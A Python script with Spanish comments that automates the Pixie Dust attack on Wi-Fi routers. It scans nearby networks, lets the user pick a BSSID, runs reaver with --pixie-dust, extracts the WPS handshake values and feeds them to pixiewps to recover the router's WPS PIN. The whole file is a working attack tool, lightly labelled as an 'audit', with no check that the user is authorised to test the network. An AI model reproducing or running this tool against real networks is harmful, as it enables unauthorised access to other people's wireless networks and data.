import subprocess

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y devuelve la salida."""
    if use_sudo:
        command = f"sudo {command}"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode(), stderr.decode()

def scan_wifi():
    """Escanea redes Wi-Fi y devuelve una lista de SSID y BSSID."""
    print("Escaneando redes Wi-Fi...\n")
    stdout, _ = run_command("iw dev wlan0 scan | grep 'SSID\\|BSSID'")
    networks = []
    lines = stdout.splitlines()
    current_bssid = None
    for line in lines:
        if "BSSID" in line:
            current_bssid = line.split()[-1]
        elif "SSID" in line:
            ssid = line.split(":")[-1].strip()
            if current_bssid and ssid:
                networks.append((ssid, current_bssid))
                current_bssid = None
    return networks

def perform_pixie_dust_attack(bssid):
    """Realiza el ataque Pixie Dust usando pixiewps."""
    print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
    # Captura los valores necesarios con `reaver`
    stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
    
    if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
        print("Información obtenida para Pixie Dust:")
        print(stdout)
        print("\nEjecutando pixiewps...\n")

        # Extraer los parámetros necesarios
        pke = extract_value(stdout, "PKE:")
        pkr = extract_value(stdout, "PKR:")
        ehash1 = extract_value(stdout, "E-Hash1:")
        ehash2 = extract_value(stdout, "E-Hash2:")
        authkey = extract_value(stdout, "AuthKey:")

        # Ejecutar pixiewps con los valores extraídos
        pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
        pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)

        if "WPS pin:" in pixie_stdout:
            pin = extract_value(pixie_stdout, "WPS pin:")
            print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
            return pin
        else:
            print("\nPixie Dust no pudo encontrar el PIN.")
            return None
    else:
        print("\nNo se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        print(stderr)
        return None

def extract_value(output, key):
    """Extrae un valor específico de la salida basada en una clave."""
    for line in output.splitlines():
        if key in line:
            return line.split(key)[-1].strip()
    return None

def main():
    # Escanear redes Wi-Fi
    networks = scan_wifi()
    if not networks:
        print("No se encontraron redes Wi-Fi.\n")
        return

    # Mostrar redes disponibles
    print("\nRedes Wi-Fi detectadas:")
    for i, (ssid, bssid) in enumerate(networks, start=1):
        print(f"{i}. SSID: {ssid} | BSSID: {bssid}")

    # Seleccionar red para auditar
    try:
        choice = int(input("\nSelecciona la red para auditar (número): "))
        selected_ssid, selected_bssid = networks[choice - 1]
        print(f"\nRed seleccionada: {selected_ssid} ({selected_bssid})")
    except (ValueError, IndexError):
        print("Selección inválida. Saliendo...")
        return

    # Intentar auditoría Pixie Dust
    perform_pixie_dust_attack(selected_bssid)

if __name__ == "__main__":
    main()



